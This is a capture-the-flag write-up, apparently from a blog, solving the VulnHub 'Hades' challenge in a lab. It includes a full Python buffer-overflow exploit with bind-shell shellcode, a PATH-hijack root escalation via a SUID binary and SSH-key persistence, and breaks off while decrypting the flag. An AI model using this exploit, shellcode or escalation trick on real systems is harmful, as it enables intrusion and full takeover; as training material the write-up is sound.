A few weeks ago, [VulnHub](http://www.vulnhub.com) hosted the Hades [competition](http://blog.vulnhub.com/2014/04/competition-hades.html); a capture the flag challenge created by Lok_Sigma. Hades is touted as a difficult boot2root, requiring some experience in exploit writing and reverse engineering. The competition ran for a good 4 weeks, and with submissions now closed, I've decided to go ahead post my solution. 

<!--more-->

### Looking for holes

I started off by running netdiscover in order to identify Hades' IP address. Since I was only running two virtual machines in the 172.16.229.0/24 network, it was easy to identify Hades:

```
root@kali:~# netdiscover -r 172.16.229.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
 _____________________________________________________________________________
   IP            At MAC Address      Count  Len   MAC Vendor                   
 ----------------------------------------------------------------------------- 
 172.16.229.1    00:50:56:c0:00:01    01    060   VMWare, Inc.                 
 172.16.229.130  00:0c:29:f7:63:14    01    060   VMware, Inc.                 
 172.16.229.254  00:50:56:e5:12:da    01    060   VMWare, Inc. 
```

Target acquired! Hades had been assigned the IP address 172.16.229.130. The next step was to scan for any open services that might be vulnerable to something. I busted out nmap and scanned the entire TCP port range: 

```
root@kali:~# nmap -T5 -p- 172.16.229.130

Starting Nmap 6.40 ( http://nmap.org ) at 2014-04-13 18:40 EDT
Nmap scan report for 172.16.229.130
Host is up (0.00040s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
65535/tcp open  unknown
MAC Address: 00:0C:29:F7:63:14 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 14.70 seconds
```

Two open ports were discovered, SSH on port 22, and some unknown service on port 65535. I decided to check out port 65535 first using netcat:

```
root@kali:~# nc -v 172.16.229.130 65535
nc: 172.16.229.130 (172.16.229.130) 65535 [65535] open
Welcome to the jungle.  
Enter up to two commands of less than 121 characters each.
```

It was some kind of service that was waiting for user input. I went ahead and played with it for a bit. The first two commands were acknowledged by the service with a "Got it". Any additional input was ignored, although the service never terminated the connection: 

```
root@kali:~# nc -v 172.16.229.130 65535
nc: 172.16.229.130 (172.16.229.130) 65535 [65535] open
Welcome to the jungle.  
Enter up to two commands of less than 121 characters each.
AAAAA
Got it
BBBBB
Got it
CCCCC
DDDDD
EEEEE
```

I spent a little bit of time trying different kinds of input to see if I could change its behavior or trigger some command injection. Nothing worked, so I moved on to port 22. 

Port 22 is usually SSH, so I tried connecting to it using ssh as the root user. 

```
root@kali:~# ssh root@172.16.229.130
The authenticity of host '172.16.229.130 (172.16.229.130)' can't be established.
ECDSA key fingerprint is 0b:8d:d1:bf:6e:b8:cf:99:38:64:f0:58:bb:3c:45:77.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.229.130' (ECDSA) to the list of known hosts.

f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAoIUECDQAAABUDgAAAAAAADQAIAAIACgAHwAcAAYAAAA0
AAAANIAECDSABAgAAQAAAAEAAAUAAAAEAAAAAwAAADQBAAA0gQQINIEECBMAAAATAAAABAAAAAEA
AAABAAAAAAAAAACABAgAgAQIxAsAAMQLAAAFAAAAABAAAAEAAADECwAAxJsECMSbBAhQAQAAVAEA
AAYAAAAAEAAAAgAAANALAADQmwQI0JsECPAAAADwAAAABgAAAAQAAAAEAAAASAEAAEiBBAhIgQQI
RAAAAEQAAAAEAAAABAAAAFDldGTUCgAA1IoECNSKBAg0AAAANAAAAAQAAAAEAAAAUeV0ZAAAAAAA
AAAAAAAAAAAAAAAAAAAABwAAAAQAAAAvbGliL2xkLWxpbnV4LnNvLjIAAAQAAAAQAAAAAQAAAEdO
VQAAAAAAAgAAAAYAAAAaAAAABAAAABQAAAADAAAAR05VANJBvMDw11QSw/6DTdNFcytZB1xQAwAA
ABEAAAALAAAADwAAAA0AAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAMAAAACAAAABgAAAAQAAAAFAAAA
CAAAAAkAAAAQAAAADAAAAAoAAAAOAAAABwAAAAIAAAAQAAAAAQAAAAUAAAAAIAAgAAAAABAAAACt
.
.
.
SUJDXzIuMABiemVyb0BAR0xJQkNfMi4wAF9lZGF0YQBfZmluaQBodG9uc0BAR0xJQkNfMi4wAGFj
Y2VwdEBAR0xJQkNfMi4wAHN0cmNweUBAR0xJQkNfMi4wAG1hbGxvY0BAR0xJQkNfMi4wAF9fZGF0
YV9zdGFydABwdXRzQEBHTElCQ18yLjAAdjEAX19nbW9uX3N0YXJ0X18AX19kc29faGFuZGxlAF9J
T19zdGRpbl91c2VkAF9fbGliY19zdGFydF9tYWluQEBHTElCQ18yLjAAd3JpdGVAQEdMSUJDXzIu
MABfX2xpYmNfY3N1X2luaXQAYmluZEBAR0xJQkNfMi4wAF9lbmQAc3RybmNweUBAR0xJQkNfMi4w
AF9zdGFydABfZnBfaHcAX19ic3Nfc3RhcnQAbWFpbgBsaXN0ZW5AQEdMSUJDXzIuMABfSnZfUmVn
aXN0ZXJDbGFzc2VzAHNvY2tldEBAR0xJQkNfMi4wAF9fVE1DX0VORF9fAF9JVE1fcmVnaXN0ZXJU
TUNsb25lVGFibGUAX2luaXQAdjAAdjIA

root@172.16.229.130's password: 
```

A large block of text was immediately returned. I copied the first few characters "f0VMRgEBAQ" and entered it into Google. The results implied that the block of text was something that had been Base64 encoded. 

![](/images/2014-05-16/01.png)

With that in mind, I copied the block of test into a file called "foo.txt" and used the base64 command to decode it and redirect the results into a file called "bar"

```
root@kali:~# base64 -d foo.txt > bar
root@kali:~# file bar
bar: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xc0bc41d21254d7f04d83fec32b7345d3505c0759, not stripped

As it turned out, the decoded file was a ELF executable. Out of curiousity to see what it would do I went ahead and ran the program. 

root@kali:~# chmod 755 bar
root@kali:~# ./bar
```

It generated no output, but it was definitely doing something since it didn't exit. Suspecting that this was the same service running on port 65535 on Hades, I attempted to connect to the same port on my machine:

```
root@kali:~# nc -v localhost 65535
nc: cannot connect to localhost (::1) 65535 [65535]: Connection refused
nc: localhost (127.0.0.1) 65535 [65535] open
Welcome to the jungle.  
Enter up to two commands of less than 121 characters each.
```

Sure enough, my assumption was correct. I now had a local copy of the service for closer inspection, and I was betting that the keys to the kingdom were in there somewhere. 


### Pwning port 65535

This service requested that each command should be less than 121 characters each. I decided to see how it would handle 200 characters. On one terminal, I set ulimit for core files to unlimited and restarted bar. 

```
root@kali:~# ulimit -c unlimited
root@kali:~# ./bar
```

Once the service was running, I sent 200 bytes to the service:

```
root@kali:~# python -c 'print "A" * 200' | nc localhost 65535
Welcome to the jungle.  
Enter up to two commands of less than 121 characters each.
Got it
Got it
root@kali:~# 
```

Sure enough, the service crashed with a segmentation fault and core dumped:

```
Received: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Received: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

here
Segmentation fault (core dumped)
root@kali:~#
```

I loaded up the core file in gdb and examined the registers. 

```
root@kali:~# gdb -q -c core
[New LWP 4776]
Core was generated by `./bar'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb) i r
eax            0x5	5
ecx            0xb77244c0	-1217248064
edx            0xb7725340	-1217244352
ebx            0xb7723ff4	-1217249292
esp            0xbfd107c0	0xbfd107c0
ebp            0x41414141	0x41414141
esi            0x0	0
edi            0x0	0
eip            0x41414141	0x41414141
eflags         0x10246	[ PF ZF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb)
```

EIP and EBP had both been overwritten with 0x41414141, so I knew I could control the program's execution flow. Looking at the stack showed that I controlled a good chunk of it. 

```
(gdb) x/40wx $esp
0xbfd107c0:	0xbf004141	0x08048acb	0x00000007	0x00000001
0xbfd107d0:	0x00000000	0xb7762ff4	0x41762ff4	0x41414141
0xbfd107e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfd107f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfd10800:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfd10810:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfd10820:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfd10830:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfd10840:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfd10850:	0x41414141	0x02850002	0x0100007f	0x00000000
```

Unfortunately the area I controlled was 32 bytes away from ESP. I would need to find a way to remove at least 32 bytes from the stack and then jump to it so I could execute my shellcode. Before going any further, I needed to find EIP's offset. Metasploit's pattern_create.rb did the job:  

```
root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 200 | nc localhost 65535
Welcome to the jungle.  
Enter up to two commands of less than 121 characters each.
Got it
Got it
```

I loaded up the new core file and it showed that EIP had been overwritten by  0x41376641

```
root@kali:~# gdb -q -c core
[New LWP 4829]
Core was generated by `./bar'.
Program terminated with signal 11, Segmentation fault.
#0  0x41376641 in ?? ()
(gdb)

Using pattern_offset.rb, I identified EIP's offset at 171:

root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41376641
[*] Exact match at offset 171

```

I controlled a decent portion of the stack for storing shellcode but that wouldn't do much good if the binary was compiled with NX. I ran checksec.sh against the binary:

```
root@kali:~# ./checksec.sh --file bar
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   bar
```

No NX so I could definitely execute shellcode on the stack. However I still had to figure out how to jump to the shellcode, which was 32 bytes away from the stack. I decided to have a look at the instructions in the binary using objdump. I was interested in add or pop instructions that operated on ESP. I found one in particular that would add 28 bytes to ESP.  

```
root@kali:~# objdump -D bar | grep -e 'add.*esp'
 80489a9:	83 84 24 8c 01 00 00 	addl   $0x1,0x18c(%esp)
 8048a32:	83 c4 1c             	add    $0x1c,%esp
```
 
ADD $0x1C,%ESP would be perfect for removing 28 bytes. That meant i just needed a POP instruction to remove another 4 bytes and the top of the stack would contain my shellcode. As it turned out, this particular instruction happened to be followed by 4 POP instructions and a RET:

```
root@kali:~# gdb -q -batch -n -se bar -ex 'x/10i 0x08048a32'
   0x8048a32 <__libc_csu_init+82>:	add    $0x1c,%esp
   0x8048a35 <__libc_csu_init+85>:	pop    %ebx
   0x8048a36 <__libc_csu_init+86>:	pop    %esi
   0x8048a37 <__libc_csu_init+87>:	pop    %edi
   0x8048a38 <__libc_csu_init+88>:	pop    %ebp
   0x8048a39 <__libc_csu_init+89>:	ret    
   0x8048a3a <__i686.get_pc_thunk.bx>:	mov    (%esp),%ebx
   0x8048a3d <__i686.get_pc_thunk.bx+3>:	ret    
   0x8048a3e <__i686.get_pc_thunk.bx+4>:	nop
   0x8048a3f <__i686.get_pc_thunk.bx+5>:	nop
```

So this instruction would remove 44 bytes from the stack, which would still return to an area I controlled. After executing RET, this would set EIP to the next address on the stack. This address should ideally point to a JMP ESP instruction. Using msfelfscan I was able to find one such address in the binary:

```

root@kali:~# msfelfscan -j esp bar
[bar]
0x08048697 jmp esp
```

To exploit this program, EIP needed to be overwritten with 0x08048a32, which would clear the stack. That series of instructions ends with a RET, which would set EIP to an address pointing to a JMP ESP. This in turn would begin executing the shellcode. I started the PoC with the following:

```python
#!/usr/bin/env python
import socket, struct

target = "127.0.0.1"
port = 65535

buf  = "A" * 17                         # junk  
buf += struct.pack("<I", 0x08048697)    # jmp esp
buf += "B" * 150                        # shellcode goes here
buf += struct.pack("<I", 0x08048a32)    # add 0x1c/pop/pop/pop/pop/ret 
buf += "C"* 25                          # junk

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.recv(1024)
s.send(buf)
s.recv(1024)
s.close()
```

I restarted the service, attached gdb to it, and set a breakpoint at 0x08048a32.

```text
root@kali:~# gdb -q -p 4817
Attaching to process 4817
Reading symbols from /root/bar...(no debugging symbols found)...done.
Reading symbols from /lib/i386-linux-gnu/libc.so.6...(no debugging symbols found)...done.
Loaded symbols for /lib/i386-linux-gnu/libc.so.6
Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
0xb76acafc in accept () from /lib/i386-linux-gnu/libc.so.6
(gdb) break *0x08048a32
Breakpoint 1 at 0x8048a32
(gdb) c
Continuing.
```

I executed the PoC which in turn overwrote EIP and redirected execution to 0x08048a32. At this point gdb paused. Examining the next 6 instructions in EIP showed I was in the right location. 

```
Breakpoint 1, 0x08048a32 in __libc_csu_init ()
(gdb) x/6i $eip
=> 0x8048a32 <__libc_csu_init+82>:	add    $0x1c,%esp
   0x8048a35 <__libc_csu_init+85>:	pop    %ebx
   0x8048a36 <__libc_csu_init+86>:	pop    %esi
   0x8048a37 <__libc_csu_init+87>:	pop    %edi
   0x8048a38 <__libc_csu_init+88>:	pop    %ebp
   0x8048a39 <__libc_csu_init+89>:	ret  
```

The first five instructions would clear the top of the stack, so I stepped through them. Before executing the RET, I looked at the stack:

```
(gdb) ni
0x08048a35 in __libc_csu_init ()
(gdb) 
0x08048a36 in __libc_csu_init ()
(gdb) 
0x08048a37 in __libc_csu_init ()
(gdb) 
0x08048a38 in __libc_csu_init ()
(gdb) 
0x08048a39 in __libc_csu_init ()
(gdb) x/20wx $esp
0xbfc44d9c:	0x08048697	0x42424242	0x42424242	0x42424242
0xbfc44dac:	0x42424242	0x42424242	0x42424242	0x42424242
0xbfc44dbc:	0x42424242	0x42424242	0x42424242	0x42424242
0xbfc44dcc:	0x42424242	0x42424242	0x42424242	0x42424242
0xbfc44ddc:	0x42424242	0x42424242	0x42424242	0x42424242
```

The top of the stack contained the address 0x08048697, which pointed to a JMP ESP instruction. After that executed, EIP would be pointing to the top of the stack right at the start of my shellcode. 

The following shellcode from http://repo-shell-storm.org will bind a shell on port 11111/TCP

```python
# 73-byte bind shell shellcode on TCP/11111
# http://repo.shell-storm.org/shellcode/files/shellcode-836.php
shellcode = (
"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"
"\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68"
"\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1"
"\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd"
"\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f"
"\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x41\xcd\x80"
)
```

At this point, I completed the PoC as follows: 

```python
#!/usr/bin/env python
import socket, struct

# 73-byte bind shell shellcode on TCP/11111
# http://repo.shell-storm.org/shellcode/files/shellcode-836.php
shellcode = (
"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"
"\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68"
"\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1"
"\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd"
"\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f"
"\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x41\xcd\x80"
)

buf =  "\x41"*17                        # this stuff gets pop'd off
buf += struct.pack("<I", 0x08048697)    # jmp esp. land here after we pop
                                        # the stack several times

buf += shellcode                        # bind shellcode
buf += "\x42"*77                        # junk
buf += struct.pack("<I", 0x08048a32)    # add 0x1c/pop/pop/pop/pop/ret
buf += "\x43"*25                        # junk

target = "127.0.0.1"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, 65535))

s.recv(1024)
s.send(buf)
s.recv(1024)
s.close()
```

I restarted the service, ran the exploit, and used netstat to verify that port 11111 had been opened:

```text
root@kali:~# netstat -antp | grep 11111
tcp        0      0 0.0.0.0:11111           0.0.0.0:*               LISTEN      29231/bar
```

I fired up netcat and connected to port 11111 and obtained a shell. 

```
root@kali:~# nc -v localhost 11111
nc: cannot connect to localhost (::1) 11111 [11111]: Connection refused
nc: localhost (127.0.0.1) 11111 [11111] open
id
uid=0(root) gid=0(root) groups=0(root)
hostname
kali
```

Confident that I had a working exploit, I updated the code to target 172.16.229.130. I ran the exploit once again, and used netcat to connect to port 11111 on 172.16.229.130

```
root@kali:~# nc -v 172.16.229.130 11111
nc: 172.16.229.130 (172.16.229.130) 11111 [11111] open
id
uid=1000(loki) gid=1000(loki) groups=1000(loki),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
hostname
Hades
```

I now had a foothold on the server as user loki. Now I had to escalate to a root shell get that flag.  


### Getting a root shell

Before going any further, I decided to setup a passwordless SSH login into the server. By copying my SSH public key over to loki's account, I could login with SSH and get a proper interactive shell. On Hades: 

```
cd /home/loki
mkdir .ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAl+87gccDnr6OVHGe97cdIsRycY2fBzwXeM3RjWBQuUUunTUgWW4568XM/NrqPxTCOu4vrsBYVEN3YBbHQ/53z0BClO6LCI5UysNjszYnpRP4H7fO6fsq21UJu6iTlZS+Pw6AZyruvXXBQmZ3zn6AkBSRPlAuDrxPaHHsHWQBhr5KcGr68rrD7xL7y+VNWUHzXYCjQ51/oy0ssnGFv553zXVkkTOlu8UL5NeOEHfCzeIKEnRe+A8032NvvZGt5E2nHFWYpoyfvyrh0i/M+NRjkHZJBQ2cR9OGLvIs0Dn3Spt/IuGWU5BsSpFCuSlm2CDC02Wmi+27rhCEe2gCPkQz root@kali' > .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
chmod 700 .ssh
```

I went ahead and killed the netcat connection and logged in to Hades directly as loki.

```
# ssh loki@172.16.229.130
.
.
.
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

loki@Hades:~$
```

I listed the contents of loki's home directory and found a couple of interesting files: loki_server and notes.

```
loki@Hades:~$ ls -latr
total 44
-rw-r--r-- 1 root root   40 Mar 18 20:22 .bash_history
-rwsr-sr-x 1 loki loki 7035 Mar 18 20:57 loki_server
drwxr-xr-x 3 root root 4096 Mar 19 06:23 ..
-rw-r--r-- 1 loki loki  675 Mar 19 06:23 .profile
-rw-r--r-- 1 loki loki 3486 Mar 19 06:23 .bashrc
-rw-r--r-- 1 loki loki  220 Mar 19 06:23 .bash_logout
-rw-r--r-- 1 root root   42 Mar 19 18:59 notes
drwxr-xr-x 4 loki loki 4096 Apr 15 01:17 .
drwx------ 2 loki loki 4096 Apr 15 01:18 .ssh
drwx------ 2 loki loki 4096 Apr 15 01:20 .cache
```

loki_server seemed to be the same service I just exploited. The contents of notes appeared to be hints of some sort:

```
loki@Hades:~$ cat notes 
AES 256 CBC
Good for you and good for me.
```

I kept note of that knowing that it would probably come in handy later. 

I didn't have permissions to view the contents of /root just yet so I did a bit of exploring on the server. Eventually I found a couple of things that looked interesting: /root/key_file and /root/display_root_ssh_key. I didn't have read permissions on /root/key_file, so I decided to look into /root/display_root_ssh_key instead. 

```
loki@Hades:/display_root_ssh_key$ ls -la
total 280
drwxr-xr-x  2 root root   4096 Mar 18 20:31 .
drwxr-xr-x 23 root root   4096 Mar 19 17:27 ..
-rw-------  1 root root      1 Mar 19 19:38 counter
-rwsr-sr-x  1 root root 273048 Mar 18 20:31 display_key
loki@Hades:/display_root_ssh_key$
```

This looked promising. display_key had SUID root permissions, so if I could make it launch a shell for me, I could get root privileges. There was another file, counter, but alas I had no read access to its contents. I went ahead and executed display_key to see what it did. 

```
loki@Hades:/display_root_ssh_key$ ./display_key 

	Ready to dance?

Enter password: 
12345     
loki@Hades:/display_root_ssh_key$ ./display_key 

	Ready to dance?

Enter password: 
password
loki@Hades:/display_root_ssh_key$ 
Broadcast message from loki@Hades
	(/dev/pts/0) at 10:10 ...

The system is going down for reboot NOW!
Connection to 172.16.229.130 closed by remote host.
Connection to 172.16.229.130 closed.
```

For some reason the machine rebooted the second time I ran the program. I figured this must be some kind of countermeasure to prevent automated fuzzing, or just to annoy the attacker. After Hades had restarted, I decided to copy display_key over to my machine and examine it there.

```
root@kali:~# scp loki@172.16.229.130:/display_root_ssh_key/display_key .
.
.
.
display_key                                                    100%  267KB 266.7KB/s   00:00    
root@kali:~# file display_key 
display_key: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, stripped
```

The file command reported it as a static stripped executable, meaning debugging this would be difficult. 

Before examining the file further, I removed /sbin/reboot on my machine and replaced it with a symbolic link to /bin/hostname. If display_root was calling the reboot command, this would prevent my machine from rebooting. 

```
root@kali:~# ls -l /sbin/reboot
lrwxrwxrwx 1 root root 4 Jan  8 21:15 /sbin/reboot -> halt
root@kali:~# ln -sf /bin/hostname /sbin/reboot
root@kali:~# ls -l /sbin/reboot
lrwxrwxrwx 1 root root 13 Apr 14 11:55 /sbin/reboot -> /bin/hostname
```

With some precuations in place, I ran the program again.

```
root@kali:~# ./display_key 

	Ready to dance?

Enter password: 
12345
Segmentation fault (core dumped)
```

It was odd that it crashed immediately, which was different from how it behaved on Hades. I tried running it with gdb but it wasn't very informative, so I decided to use strace instead. I ran display_key against it and found the reason for the crash: 

```
root@kali:~# strace -i -ff ./display_key 
[b768e5ea] execve("./display_key", ["./display_key"], [/* 31 vars */]) = 0
[00c3cb40] old_mmap(0xc3e000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0xbfa3124409a97020) = 0xc3e000
[00c3e05d] readlink("/proc/self/exe", "/root/display_key", 4096) = 17
.
.
.
[080569fe] write(1, "Enter password: \n", 17Enter password: 
) = 17
[080568b1] fstat64(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 6), ...}) = 0
[08057533] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7707000
[0805699e] read(0, 12345
"12345\n", 1024)     = 6
[080568ee] open("counter", O_RDONLY)    = -1 ENOENT (No such file or directory)
[08049d8b] --- SIGSEGV (Segmentation fault) @ 0 (0) ---
[????????] +++ killed by SIGSEGV +++
Segmentation fault
```

The counter file was missing. I went ahead and created it to see what would happen. Since I couldn't read the actual counter file, I just threw in some random value in it. 

```
root@kali:~# echo 1234 > counter
root@kali:~# strace -i -ff./display_key 
[b76a15ea] execve("./display_key", ["./display_key"], [/* 31 vars */]) = 0
[00c3cb40] old_mmap(0xc3e000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0xbfb38e84089a8020) = 0xc3e000
.
.
.
[080569fe] write(1, "Enter password: \n", 17Enter password: 
) = 17
[080568b1] fstat64(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 6), ...}) = 0
[08057533] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb774d000
[0805699e] read(0, 1234
"1234\n", 1024)      = 5
[080568ee] open("counter", O_RDONLY)    = 3
[080568b1] fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
[08057533] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb774c000
[0805699e] read(3, "1234\n", 4096)      = 5
[08056947] close(3)                     = 0
[080575c1] munmap(0xb774c000, 4096)     = 0
[080568ee] open("counter", O_RDWR|O_CREAT|O_TRUNC, 0666) = 3
[080568b1] fstat64(3, {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
[08057533] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb774c000
[080569fe] write(3, "2", 1)             = 1
[08056947] close(3)                     = 0
[080575c1] munmap(0xb774c000, 4096)     = 0
[080569fe] write(1, "Enter password: \n", 17Enter password: 
) = 17
```

Ok, much better. The program opens the counter file to change its contents, but for what purpose, I didn't know. I ran the program again until it triggered its reboot feature. This is the interesting bit that caught my eye: 

```
[080490af] clone(Process 27730 attached
child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbf9b67e4) = 27730
[pid 27638] [080567de] waitpid(27730, Process 27638 suspended
 <unfinished ...>
[pid 27730] [08065dcf] rt_sigaction(SIGINT, {SIG_DFL, [], 0}, NULL, 8) = 0
[pid 27730] [08065dcf] rt_sigaction(SIGQUIT, {SIG_DFL, [], 0}, NULL, 8) = 0
[pid 27730] [08065ed9] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
[pid 27730] [08056844] execve("/bin/sh", ["sh", "-c", "reboot"], [/* 32 vars */]) = 0
[pid 27730] [b77c325d] brk(0)           = 0x98e9000
[pid 27730] [b77c4461] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
[pid 27730] [b77c45a3] mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77ab000
```

The program calls reboot without specifying an absolute PATH. This meant I could trick it into running my own code as long as it was in a directory before /sbin. I created a reboot symbolic link to /bin/dash in my home directory and updated my PATH variable so that my home directory was first on the list. 

```
root@kali:~# ln -s /bin/dash reboot
root@kali:~# export PATH=/root:${PATH}
root@kali:~# ls -l reboot
lrwxrwxrwx 1 root root 9 Apr 14 21:05 reboot -> /bin/dash
root@kali:~# echo $PATH
/root:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Once that was done, I ran display_root again until it triggered its call to reboot, and gave me a shell instead:

```
root@kali:~# ./display_key 

	Ready to dance?

Enter password: 
12345
#
# id
uid=0(root) gid=0(root) groups=0(root)
```

Could it be that simple? I decided to try it on Hades and see if it would work. I created the same setup as I had done on my machine so that I had a symbolic link reboot to /bin/dash and updated my PATH so that my symbolic link to /bin/dash would be called instead of /sbin/reboot:

```
loki@Hades:~$ pwd
/home/loki
loki@Hades:~$ ln -s /bin/dash reboot
loki@Hades:~$ export PATH=/home/loki:${PATH}
loki@Hades:~$ ls -l reboot
lrwxrwxrwx 1 loki loki 9 Apr 15 02:52 reboot -> /bin/dash
loki@Hades:~$ echo $PATH
/home/loki:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
loki@Hades:~$ cd /display_root_ssh_key/
```

Fingers crossed, I executed display_key several times until the reboot feature was triggered: 

```
loki@Hades:/display_root_ssh_key$ ./display_key 

	Ready to dance?

Enter password: 
12345
# id
uid=1000(loki) gid=1000(loki) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(loki)
# whoami
root
```

Yes! Sure enough, the program called reboot, but instead executed /home/loki/reboot which in turn dropped me into a root shell. 

### Capturing the flag

I quickly headed over to /root and did a directory listing. 

```
# ls -latr
total 36
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
drwx------  2 root root 4096 Mar 18 19:50 .cache
drwx------  2 root root 4096 Mar 18 20:46 .ssh
drwxr-xr-x 23 root root 4096 Mar 19 17:27 ..
-rw-------  1 root root 1352 Mar 19 19:04 .viminfo
-rw-r--r--  1 root root 3376 Mar 19 19:05 flag.txt.enc
drwx------  4 root root 4096 Mar 19 19:07 .
-rw-r--r--  1 root root  363 Apr  4 19:08 .bash_history
```

I found the flag, but it was encrypted. The challenge wasn't over yet. The file command wasn't available on Hades, but using xxd, I recognized the header as a file encrypted with the openssl command:

```
# xxd -g1 flag.txt.enc | head
0000000: 53 61 6c 74 65 64 5f 5f ee 05 ba c2 01 15 15 46  Salted__.......F
0000010: d0 b7 40 5a c8 b3 3a 7d ea e8 13 27 4c ba 3d 17  ..@Z..:}...'L.=.
0000020: 0d 7e af 60 7f 8f 2d 68 22 d4 0c 19 f6 da 13 09  .~.`..-h".......
0000030: 06 73 60 12 24 b2 89 38 d5 e4 c7 67 90 03 b1 36  .s`.$..8...g...6
0000040: 2c 58 56 0d 61 a6 71 c4 94 ed 9f 48 9e 60 b0 0b  ,XV.a.q....H.`..
0000050: 88 11 39 99 c7 ea 2d 8d 97 4c d7 aa ff 95 7d b5  ..9...-..L....}.
0000060: fe 2c 2c 91 88 ba b9 1f d0 e7 4e 9e c8 99 5b 66  .,,.......N...[f
0000070: 08 5c da a7 3a 35 b9 c1 3e 43 76 8f 44 78 f7 8a  .\..:5..>Cv.Dx..
0000080: 86 33 75 dc 32 fd 8d 37 f9 3a 05 df ff fc 73 e1  .3u.2..7.:....s.
0000090: d6 22 eb 90 d3 1c ab 31 b8 cf a4 5b a8 b8 be 96  .".....1...[....
```

I remembered the file /home/loki/notes that mentioned "AES 256 CBC" and "Good for you and good for me.". Assuming that was the cipher and password used to encrypt the file I gave it a shot:

```
# openssl enc -d -aes-256-cbc -pass pass:"Good for you and good for me." -in flag.txt.enc -out flag.txt
bad decrypt
3074083016:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:evp_enc.c:539:
```

Unfortunately that didn't work. I then remembered /key_file. Now that I had root access I could read the contents. This turned out to be a binary file and I couldn't see anything recognizable in it:

```
# xxd -g1 key_file | head
